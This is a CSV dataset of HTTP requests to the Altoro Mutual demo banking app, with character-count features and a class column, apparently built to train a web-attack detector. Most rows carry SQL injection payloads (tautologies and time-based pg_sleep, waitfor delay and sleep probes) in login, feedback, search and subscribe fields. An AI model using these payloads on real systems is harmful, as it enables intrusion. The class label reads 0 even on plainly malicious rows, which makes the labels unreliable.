method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%202%2b52-52-1%3d0%2b0%2b0%2b1%20or%20'srSKxwbw'%3d'&uid=test2""",4,0,0,0,4,1,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203%2b52-52-1%3d0%2b0%2b0%2b1%20or%20'srSKxwbw'%3d'&uid=test2""",4,0,0,0,4,1,0
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=%40%40ADpWu&email_addr=sample%40email.tst&name=ekpivksl&subject=1',0,0,0,0,0,0,0
POST,b'/sendFeedback',"b""submit=Submit&cfile=9IQuc2fG'));%20waitfor%20delay%20'0:0:9'%20--%20&comments=1&email_addr=sample%40email.tst&name=hpjvaent&subject=1""",3,0,1,0,5,2,0
GET,b'/',b'',0,0,0,0,0,0,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203*2<(0%2b5%2b52-52)%20or%20'srSKxwbw'%3d'&uid=test2""",4,0,0,1,4,1,0
GET,b'/util/serverStatusCheckService.jsp?HostName=AltoroMutual&HostName=-1%20OR%202%2b521-521-1%3d0%2b0%2b0%2b1',b'',0,0,0,0,2,0,0
GET,"b""/tIkUO7tR');select%20pg_sleep(3);%20--%20.htm""",b'',1,0,1,1,3,2,0
GET,"b""/swagger/xSPzOkNl';select%20pg_sleep(9);%20--%20.html""",b'',1,0,1,1,3,2,0
GET,b'/util/serverStatusCheckService.jsp?HostName=AltoroMutual&HostName=JyI%3d',b'',0,0,0,0,0,0,0
GET,b'/search.jsp?query=-1%22%20OR%202%2b242-242-1%3d0%2b0%2b0%2b1%20--%20',b'',0,1,1,0,4,0,0
GET,"b""/IsigJEGw'));select%20pg_sleep(3);%20--%20.htm""",b'',1,0,1,1,3,2,0
GET,"b""/swagger/GxPPyjYq');select%20pg_sleep(3);%20--%20.html""",b'',1,0,1,1,3,2,0
GET,b'/search.jsp?query=-1%22%20OR%203%2b242-242-1%3d0%2b0%2b0%2b1%20--%20',b'',0,1,1,0,4,0,0
GET,b'/',b'',0,0,0,0,0,0,0
GET,b'/',b'',0,0,0,0,0,0,0
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=JyI%3d&email_addr=sample%40email.tst&name=ekpivksl&subject=1',0,0,0,0,0,0,0
POST,b'/sendFeedback',"b""submit=Submit&cfile=ZatG4WmN';select%20pg_sleep(3);%20--%20&comments=1&email_addr=sample%40email.tst&name=hpjvaent&subject=1""",1,0,1,1,3,2,0
GET,"b""/util/serverStatusCheckService.jsp?HostName=AltoroMutual&HostName=-1'%20OR%202%2b486-486-1%3d0%2b0%2b0%2b1%20--%20""",b'',1,0,1,0,4,0,0
GET,"b""/util/serverStatusCheckService.jsp?HostName=AltoroMutual&HostName=%bf'%bf%22""",b'',1,1,0,0,0,0,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203*2>(0%2b5%2b52-52)%20or%20'srSKxwbw'%3d'&uid=test2""",4,0,0,1,4,1,0
GET,b'/',b'',0,0,0,0,0,0,0
GET,b'/',b'',0,0,0,0,0,0,0
GET,"b""/swagger/7bDRSqgX'));select%20pg_sleep(3);%20--%20.html""",b'',1,0,1,1,3,2,0
GET,b'/survey_questions.jsp?step=b',b'',0,0,0,0,0,0,0
GET,b'/search.jsp?query=-1%22%20OR%203*2<(0%2b5%2b242-242)%20--%20',b'',0,1,1,1,4,0,0
POST,b'/sendFeedback',"b""submit=Submit&cfile=comments.txt&comments=%bf'%bf%22&email_addr=sample%40email.tst&name=ekpivksl&subject=1""",1,1,0,0,0,0,0
GET,"b""/util/serverStatusCheckService.jsp?HostName=AltoroMutual&HostName=-1'%20OR%202%2b245-245-1%3d0%2b0%2b0%2b1%20or%20'eFrzFmG6'%3d'""",b'',4,0,0,0,4,0,0
GET,"b""/util/serverStatusCheckService.jsp?HostName=AltoroMutual&HostName=%f0''%f0%22%22""",b'',2,2,0,0,0,0,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%202%2b1-1-1%3d1%20AND%2000052%3d00052%20or%20'srSKxwbw'%3d'&uid=test2""",4,0,0,0,6,1,0
POST,b'/sendFeedback',"b""submit=Submit&cfile=E2MYsYiH');select%20pg_sleep(3);%20--%20&comments=1&email_addr=sample%40email.tst&name=hpjvaent&subject=1""",1,0,1,1,3,2,0
POST,b'/sendFeedback',"b""submit=Submit&cfile=comments.txt&comments=%f0''%f0%22%22&email_addr=sample%40email.tst&name=ekpivksl&subject=1""",2,2,0,0,0,0,0
GET,b'/search.jsp?query=-1%22%20OR%203*2>(0%2b5%2b242-242)%20--%20',b'',0,1,1,1,4,0,0
GET,b'/',b'',0,0,0,0,0,0,0
GET,"b""/survey_questions.jsp?step=1'%22""",b'',1,1,0,0,0,0,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%2000052%3d00052%20AND%203%2b1-1-1%3d1%20or%20'srSKxwbw'%3d'&uid=test2""",4,0,0,0,6,1,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203*2%3d5%20AND%2000052%3d00052%20or%20'srSKxwbw'%3d'&uid=test2""",4,0,0,0,6,1,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203*2%3d6%20AND%2000052%3d00052%20or%20'srSKxwbw'%3d'&uid=test2""",4,0,0,0,6,1,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203*2*0%3d6%20AND%2000052%3d00052%20or%20'srSKxwbw'%3d'&uid=test2""",4,0,0,0,6,1,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203*2*1%3d6%20AND%2000052%3d00052%20or%20'srSKxwbw'%3d'&uid=test2""",4,0,0,0,6,1,0
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=(select%20convert(int%2cCHAR(65)))&email_addr=sample%40email.tst&name=ekpivksl&subject=1',0,0,0,3,1,1,0
POST,b'/sendFeedback',"b""submit=Submit&cfile=2L4lGPZd'));select%20pg_sleep(6);%20--%20&comments=1&email_addr=sample%40email.tst&name=hpjvaent&subject=1""",1,0,1,1,3,2,0
GET,b'/util/serverStatusCheckService.jsp?HostName=AltoroMutual&HostName=(select%20convert(int%2cCHAR(65)))',b'',0,0,0,3,1,1,0
GET,b'/util/serverStatusCheckService.jsp?HostName=AltoroMutual&HostName=-1%22%20OR%202%2b565-565-1%3d0%2b0%2b0%2b1%20--%20',b'',0,1,1,0,4,0,0
GET,b'/survey_questions.jsp?step=cFZWlPwE',b'',0,0,0,0,0,0,0
GET,b'/survey_questions.jsp?step=%5c',b'',0,0,0,0,0,0,0
GET,b'/',b'',0,0,0,0,0,0,0
GET,"b""/search.jsp?query=if(now()%3dsysdate()%2csleep(6)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22*/""",b'',2,2,0,14,0,3,0
POST,b'/doLogin',b'btnSubmit=Login&passw=g00dPa%2524%2524w0rD&uid=1',0,0,0,0,0,1,0
GET,b'/',b'',0,0,0,0,0,0,0
GET,"b""/survey_questions.jsp?step=b'%20AND%202%2b1-1-1%3d0%2b0%2b0%2b1%20AND%20'714x'%3d'714x""",b'',4,0,0,0,4,0,0
GET,b'/survey_questions.jsp?step=1%00%c0%a7%c0%a2',b'',0,0,0,0,0,0,0
GET,"b""/util/serverStatusCheckService.jsp?HostName=AltoroMutual&HostName=if(now()%3dsysdate()%2csleep(6)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22*/""",b'',2,2,0,14,0,3,0
GET,"b""/search.jsp?query=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'%22%2b(select(0)from(select(sleep(6)))v)%2b%22*/""",b'',2,2,0,15,0,9,0
GET,b'/',b'',0,0,0,0,0,0,0
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%2540email.tst&name=ekpivksl&subject=1',0,0,0,0,0,0,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=1'%22&uid=1""",1,1,0,0,0,1,0
GET,b'/',b'',0,0,0,0,0,0,0
GET,"b""/util/serverStatusCheckService.jsp?HostName=AltoroMutual&HostName=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'%22%2b(select(0)from(select(sleep(6)))v)%2b%22*/""",b'',2,2,0,15,0,9,0
GET,b'/survey_questions.jsp?step=%40%40ctuzT',b'',0,0,0,0,0,0,0
GET,"b""/search.jsp?query=-1;%20waitfor%20delay%20'0:0:6'%20--%20""",b'',2,0,1,0,5,2,0
GET,b'/survey_questions.jsp?step=b%22%20AND%202%2b1-1-1%3d0%2b0%2b0%2b1%20AND%20%22LmKw%22%3d%22LmKw',b'',0,4,0,0,4,0,0
POST,b'/doLogin',b'btnSubmit=Login&passw=test2&uid=-1%20OR%202%2b63-63-1%3d0%2b0%2b0%2b1%20--%20',0,0,1,0,4,1,0
POST,b'/sendFeedback',"b""submit=Submit&cfile=comments.txt&comments=1&email_addr=1'%22&name=ekpivksl&subject=1""",1,1,0,0,0,0,0
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=B8VDKsCJ&email_addr=sample%40email.tst&name=hpjvaent&subject=1',0,0,0,0,0,0,0
POST,b'/doLogin',b'btnSubmit=Login&passw=%5c&uid=1',0,0,0,0,0,1,0
GET,"b""/util/serverStatusCheckService.jsp?HostName=AltoroMutual&HostName=1%20waitfor%20delay%20'0:0:9'%20--%20""",b'',2,0,1,0,5,2,0
GET,"b""/survey_questions.jsp?step=b%25'%20AND%202%2b1-1-1%3d0%2b0%2b0%2b1%20AND%20'PJVE'%21%3d'PJVE%25""",b'',4,0,0,0,4,0,0
GET,"b""/search.jsp?query=-1);%20waitfor%20delay%20'0:0:9'%20--%20""",b'',2,0,1,0,5,2,0
POST,b'/doLogin',b'btnSubmit=Login&passw=-1%20OR%202%2b917-917-1%3d0%2b0%2b0%2b1%20--%20&uid=1',0,0,1,0,4,1,0
GET,b'/',b'',0,0,0,0,0,0,0
GET,b'/survey_questions.jsp?step=JyI%3d',b'',0,0,0,0,0,0,0
POST,b'/doLogin',b'btnSubmit=Login&passw=test2&uid=-1%20OR%202%2b128-128-1%3d0%2b0%2b0%2b1',0,0,0,0,2,1,0
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=%5c&name=ekpivksl&subject=1',0,0,0,0,0,0,0
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=-1%20OR%202%2b373-373-1%3d0%2b0%2b0%2b1%20--%20&email_addr=sample%40email.tst&name=hpjvaent&subject=1',0,0,1,0,4,0,0
GET,"b""/util/serverStatusCheckService.jsp?HostName=AltoroMutual&HostName=ivTXwBRr';%20waitfor%20delay%20'0:0:9'%20--%20""",b'',3,0,1,0,5,2,0
POST,b'/doLogin',b'btnSubmit=Login&passw=1%00%c0%a7%c0%a2&uid=1',0,0,0,0,0,1,0
GET,b'/',b'',0,0,0,0,0,0,0
POST,b'/doLogin',b'btnSubmit=Login&passw=-1%20OR%202%2b14-14-1%3d0%2b0%2b0%2b1&uid=1',0,0,0,0,2,1,0
GET,"b""/survey_questions.jsp?step=%bf'%bf%22""",b'',1,1,0,0,0,0,0
GET,"b""/survey_questions.jsp?step=if(now()%3dsysdate()%2csleep(9)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR%22*/""",b'',2,2,0,14,0,3,0
GET,"b""/search.jsp?query=-1));%20waitfor%20delay%20'0:0:9'%20--%20""",b'',2,0,1,0,5,2,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=test2&uid=-1'%20OR%202%2b956-956-1%3d0%2b0%2b0%2b1%20--%20""",1,0,1,0,4,1,0
POST,b'/doLogin',b'btnSubmit=Login&passw=%40%40CbMaN&uid=1',0,0,0,0,0,1,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%202%2b446-446-1%3d0%2b0%2b0%2b1%20--%20&uid=1""",1,0,1,0,4,1,0
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=-1%20OR%202%2b154-154-1%3d0%2b0%2b0%2b1&email_addr=sample%40email.tst&name=hpjvaent&subject=1',0,0,0,0,2,0,0
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=1%00%c0%a7%c0%a2&name=ekpivksl&subject=1',0,0,0,0,0,0,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=test2&uid=-1'%20OR%202%2b782-782-1%3d0%2b0%2b0%2b1%20or%20'zhxtV2Ta'%3d'""",4,0,0,0,4,1,0
GET,"b""/util/serverStatusCheckService.jsp?HostName=AltoroMutual&HostName=Qzq2BQk8');%20waitfor%20delay%20'0:0:9'%20--%20""",b'',3,0,1,0,5,2,0
GET,"b""/survey_questions.jsp?step=(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'%22%2b(select(0)from(select(sleep(3)))v)%2b%22*/""",b'',2,2,0,15,0,9,0
GET,b'/',b'',0,0,0,0,0,0,0
GET,"b""/survey_questions.jsp?step=%f0''%f0%22%22""",b'',2,2,0,0,0,0,0
GET,"b""/search.jsp?query=1%20waitfor%20delay%20'0:0:3'%20--%20""",b'',2,0,1,0,5,2,0
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=%40%40cd5er&name=ekpivksl&subject=1',0,0,0,0,0,0,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%202%2b123-123-1%3d0%2b0%2b0%2b1%20or%20'1wfSWBQF'%3d'&uid=1""",4,0,0,0,4,1,0
POST,b'/doLogin',b'btnSubmit=Login&passw=test2&uid=-1%22%20OR%202%2b502-502-1%3d0%2b0%2b0%2b1%20--%20',0,1,1,0,4,1,0
GET,b'/',b'',0,0,0,0,0,0,0
GET,"b""/search.jsp?query=p6CkbK5T';%20waitfor%20delay%20'0:0:3'%20--%20""",b'',3,0,1,0,5,2,0
POST,b'/doLogin',b'btnSubmit=Login&passw=JyI%3d&uid=1',0,0,0,0,0,1,0
POST,b'/sendFeedback',"b""submit=Submit&cfile=comments.txt&comments=-1'%20OR%202%2b879-879-1%3d0%2b0%2b0%2b1%20--%20&email_addr=sample%40email.tst&name=hpjvaent&subject=1""",1,0,1,0,4,0,0
GET,"b""/survey_questions.jsp?step=1%20waitfor%20delay%20'0:0:3'%20--%20""",b'',2,0,1,0,5,2,0
GET,b'/survey_questions.jsp?step=(select%20convert(int%2cCHAR(65)))',b'',0,0,0,3,1,1,0
GET,"b""/util/serverStatusCheckService.jsp?HostName=AltoroMutual&HostName=3ON9LdTx'));%20waitfor%20delay%20'0:0:3'%20--%20""",b'',3,0,1,0,5,2,0
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=JyI%3d&name=ekpivksl&subject=1',0,0,0,0,0,0,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203%2b123-123-1%3d0%2b0%2b0%2b1%20or%20'1wfSWBQF'%3d'&uid=1""",4,0,0,0,4,1,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=test2&uid=if(now()%3dsysdate()%2csleep(6)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22*/""",2,2,0,14,0,4,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=%bf'%bf%22&uid=1""",1,1,0,0,0,1,0
POST,b'/sendFeedback',"b""submit=Submit&cfile=comments.txt&comments=-1'%20OR%202%2b559-559-1%3d0%2b0%2b0%2b1%20or%20'aaMq9M6r'%3d'&email_addr=sample%40email.tst&name=hpjvaent&subject=1""",4,0,0,0,4,0,0
GET,b'/',b'',0,0,0,0,0,0,0
GET,"b""/util/serverStatusCheckService.jsp?HostName=AltoroMutual&HostName=7pO96o8s';select%20pg_sleep(6);%20--%20""",b'',1,0,1,1,3,2,0
GET,"b""/survey_questions.jsp?step=OOp9sqiY';%20waitfor%20delay%20'0:0:6'%20--%20""",b'',3,0,1,0,5,2,0
GET,"b""/search.jsp?query=xJQpTpI8');%20waitfor%20delay%20'0:0:6'%20--%20""",b'',3,0,1,0,5,2,0
POST,b'/doSubscribe',b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst',0,0,0,0,0,0,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203*2<(0%2b5%2b123-123)%20or%20'1wfSWBQF'%3d'&uid=1""",4,0,0,1,4,1,0
POST,b'/sendFeedback',"b""submit=Submit&cfile=comments.txt&comments=1&email_addr=%bf'%bf%22&name=ekpivksl&subject=1""",1,1,0,0,0,0,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=test2&uid=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'%22%2b(select(0)from(select(sleep(6)))v)%2b%22*/""",2,2,0,15,0,10,0
GET,"b""/search.jsp?query=5A7MU7pE'));%20waitfor%20delay%20'0:0:9'%20--%20""",b'',3,0,1,0,5,2,0
GET,"b""/util/serverStatusCheckService.jsp?HostName=AltoroMutual&HostName=h9XzKYVA');select%20pg_sleep(9);%20--%20""",b'',1,0,1,1,3,2,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=%f0''%f0%22%22&uid=1""",2,2,0,0,0,1,0
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=-1%22%20OR%202%2b704-704-1%3d0%2b0%2b0%2b1%20--%20&email_addr=sample%40email.tst&name=hpjvaent&subject=1',0,1,1,0,4,0,0
GET,"b""/survey_questions.jsp?step=jtuklcWT');%20waitfor%20delay%20'0:0:9'%20--%20""",b'',3,0,1,0,5,2,0
GET,b'/',b'',0,0,0,0,0,0,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=test2&uid=1%20waitfor%20delay%20'0:0:9'%20--%20""",2,0,1,0,5,3,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203*2>(0%2b5%2b123-123)%20or%20'1wfSWBQF'%3d'&uid=1""",4,0,0,1,4,1,0
POST,b'/sendFeedback',"b""submit=Submit&cfile=comments.txt&comments=1&email_addr=%f0''%f0%22%22&name=ekpivksl&subject=1""",2,2,0,0,0,0,0
GET,b'/search.jsp?query=-1;select%20pg_sleep(9);%20--%20',b'',0,0,1,1,3,2,0
GET,"b""/util/serverStatusCheckService.jsp?HostName=AltoroMutual&HostName=P2dRc4RU'));select%20pg_sleep(3);%20--%20""",b'',1,0,1,1,3,2,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=test2&uid=OK4bdQcR';%20waitfor%20delay%20'0:0:3'%20--%20""",3,0,1,0,5,3,0
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=(select%20convert(int%2cCHAR(65)))&name=ekpivksl&subject=1',0,0,0,3,1,1,0
POST,b'/doLogin',b'btnSubmit=Login&passw=(select%20convert(int%2cCHAR(65)))&uid=1',0,0,0,3,1,2,0
POST,b'/sendFeedback',"b""submit=Submit&cfile=comments.txt&comments=if(now()%3dsysdate()%2csleep(3)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR%22*/&email_addr=sample%40email.tst&name=hpjvaent&subject=1""",2,2,0,14,0,3,0
POST,b'/doSubscribe',b'btnSubmit=Subscribe&txtEmail=-1%20OR%202%2b66-66-1%3d0%2b0%2b0%2b1%20--%20',0,0,1,0,4,0,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%202%2b1-1-1%3d1%20AND%20123%3d123%20or%20'1wfSWBQF'%3d'&uid=1""",4,0,0,0,6,1,0
POST,b'/doSubscribe',"b""btnSubmit=Subscribe&txtEmail=1'%22""",1,1,0,0,0,0,0
GET,b'/',b'',0,0,0,0,0,0,0
GET,"b""/survey_questions.jsp?step=mClrW2EG'));%20waitfor%20delay%20'0:0:3'%20--%20""",b'',3,0,1,0,5,2,0
GET,b'/search.jsp?query=-1);select%20pg_sleep(3);%20--%20',b'',0,0,1,1,3,2,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=test2&uid=QLWDXWCJ');%20waitfor%20delay%20'0:0:6'%20--%20""",3,0,1,0,5,3,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1'%22""",1,1,0,0,0,1,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%20123%3d123%20AND%203%2b1-1-1%3d1%20or%20'1wfSWBQF'%3d'&uid=1""",4,0,0,0,6,1,0
POST,b'/doSubscribe',b'btnSubmit=Subscribe&txtEmail=%5c',0,0,0,0,0,0,0
GET,b'/',b'',0,0,0,0,0,0,0
POST,b'/sendFeedback',"b""submit=Submit&cfile=comments.txt&comments=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'%22%2b(select(0)from(select(sleep(6)))v)%2b%22*/&email_addr=sample%40email.tst&name=hpjvaent&subject=1""",2,2,0,15,0,9,0
POST,b'/doSubscribe',b'btnSubmit=Subscribe&txtEmail=-1%20OR%202%2b168-168-1%3d0%2b0%2b0%2b1',0,0,0,0,2,0,0
GET,"b""/survey_questions.jsp?step=lgEXVwuF';select%20pg_sleep(6);%20--%20""",b'',1,0,1,1,3,2,0
GET,b'/search.jsp?query=-1));select%20pg_sleep(6);%20--%20',b'',0,0,1,1,3,2,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=test2&uid=uaHaEPpR'));%20waitfor%20delay%20'0:0:6'%20--%20""",3,0,1,0,5,3,0
POST,b'/sendFeedback',"b""submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=1'%22&subject=1""",1,1,0,0,0,0,0
POST,b'/doSubscribe',"b""btnSubmit=Subscribe&txtEmail=-1'%20OR%202%2b373-373-1%3d0%2b0%2b0%2b1%20--%20""",1,0,1,0,4,0,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203*2%3d5%20AND%20123%3d123%20or%20'1wfSWBQF'%3d'&uid=1""",4,0,0,0,6,1,0
POST,b'/doSubscribe',b'btnSubmit=Subscribe&txtEmail=1%00%c0%a7%c0%a2',0,0,0,0,0,0,0
POST,b'/sendFeedback',"b""submit=Submit&cfile=comments.txt&comments=-1;%20waitfor%20delay%20'0:0:9'%20--%20&email_addr=sample%40email.tst&name=hpjvaent&subject=1""",2,0,1,0,5,2,0
POST,b'/doLogin',b'btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%5c',0,0,0,0,0,1,0
GET,"b""/survey_questions.jsp?step=Bo2rEJda');select%20pg_sleep(9);%20--%20""",b'',1,0,1,1,3,2,0
GET,b'/',b'',0,0,0,0,0,0,0
GET,"b""/search.jsp?query=43SdnCr2';select%20pg_sleep(9);%20--%20""",b'',1,0,1,1,3,2,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=test2&uid=n380GN9W';select%20pg_sleep(9);%20--%20""",1,0,1,1,3,3,0
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=%5c&subject=1',0,0,0,0,0,0,0
POST,b'/doSubscribe',"b""btnSubmit=Subscribe&txtEmail=-1'%20OR%202%2b154-154-1%3d0%2b0%2b0%2b1%20or%20'ycLYTKbW'%3d'""",4,0,0,0,4,0,0
POST,b'/doLogin',b'btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1%00%c0%a7%c0%a2',0,0,0,0,0,1,0
POST,b'/sendFeedback',"b""submit=Submit&cfile=comments.txt&comments=-1);%20waitfor%20delay%20'0:0:3'%20--%20&email_addr=sample%40email.tst&name=hpjvaent&subject=1""",2,0,1,0,5,2,0
GET,"b""/search.jsp?query=531F9ian');select%20pg_sleep(3);%20--%20""",b'',1,0,1,1,3,2,0
GET,"b""/survey_questions.jsp?step=IKSZpB6t'));select%20pg_sleep(9);%20--%20""",b'',1,0,1,1,3,2,0
POST,b'/doSubscribe',b'btnSubmit=Subscribe&txtEmail=%40%40EVVIk',0,0,0,0,0,0,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203*2%3d6%20AND%20123%3d123%20or%20'1wfSWBQF'%3d'&uid=1""",4,0,0,0,6,1,0
GET,b'/',b'',0,0,0,0,0,0,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=test2&uid=M7stUShc');select%20pg_sleep(3);%20--%20""",1,0,1,1,3,3,0
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=1%00%c0%a7%c0%a2&subject=1',0,0,0,0,0,0,0
POST,b'/doSubscribe',b'btnSubmit=Subscribe&txtEmail=-1%22%20OR%202%2b879-879-1%3d0%2b0%2b0%2b1%20--%20',0,1,1,0,4,0,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=test2&uid=70NKegOL'));select%20pg_sleep(6);%20--%20""",1,0,1,1,3,3,0
POST,b'/sendFeedback',"b""submit=Submit&cfile=comments.txt&comments=-1));%20waitfor%20delay%20'0:0:3'%20--%20&email_addr=sample%40email.tst&name=hpjvaent&subject=1""",2,0,1,0,5,2,0
POST,b'/doLogin',b'btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%40%40XigMQ',0,0,0,0,0,1,0
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=%40%40D5Jsr&subject=1',0,0,0,0,0,0,0
POST,b'/doSubscribe',"b""btnSubmit=Subscribe&txtEmail=if(now()%3dsysdate()%2csleep(6)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22*/""",2,2,0,14,0,3,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203*2*0%3d6%20AND%20123%3d123%20or%20'1wfSWBQF'%3d'&uid=1""",4,0,0,0,6,1,0
POST,b'/doSubscribe',b'btnSubmit=Subscribe&txtEmail=JyI%3d',0,0,0,0,0,0,0
GET,b'/',b'',0,0,0,0,0,0,0
GET,b'/index.jsp?content=inside_press.htm',b'',0,0,0,0,0,0,0
GET,"b""/search.jsp?query=EnvY0teG'));select%20pg_sleep(3);%20--%20""",b'',1,0,1,1,3,2,0
GET,"b""/index.jsp?content=1'%22""",b'',1,1,0,0,0,0,0
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=JyI%3d&subject=1',0,0,0,0,0,0,0
POST,b'/doLogin',"b""btnSubmit=Login&passw=-1'%20OR%203*2*1%3d6%20AND%20123%3d123%20or%20'1wfSWBQF'%3d'&uid=1""",4,0,0,0,6,1,0
POST,b'/doSubscribe',"b""btnSubmit=Subscribe&txtEmail=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'%22%2b(select(0)from(select(sleep(6)))v)%2b%22*/""",2,2,0,15,0,9,0
POST,b'/sendFeedback',"b""submit=Submit&cfile=comments.txt&comments=1%20waitfor%20delay%20'0:0:6'%20--%20&email_addr=sample%40email.tst&name=hpjvaent&subject=1""",2,0,1,0,5,2,0
POST,b'/doLogin',b'btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=JyI%3d',0,0,0,0,0,1,0
